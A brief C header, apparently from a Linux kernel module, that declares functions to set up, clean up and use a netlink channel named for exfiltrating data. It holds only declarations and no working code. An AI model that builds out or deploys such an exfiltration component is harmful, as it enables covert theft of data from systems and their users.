#ifndef NETLINK_EXFIL_H
#define NETLINK_EXFIL_H

#include <linux/types.h>

void setup_netlink_exfil(void);
void cleanup_netlink_exfil(void);
void exfiltrate_data(const char *data, size_t len);

#endif
